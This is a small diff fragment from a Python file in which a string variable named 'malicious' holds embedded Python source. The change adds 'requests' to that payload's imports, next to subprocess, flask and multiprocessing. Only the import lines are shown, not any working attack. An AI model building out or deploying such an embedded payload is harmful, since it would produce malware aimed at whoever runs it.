@@ -12,7 +12,7 @@ def sender(message):
 		pass
 
 malicious = """
-import os, random, subprocess, time, threading
+import os, random, subprocess, time, threading, requests
 from flask import Flask, request, send_from_directory
 from multiprocessing import Process
 
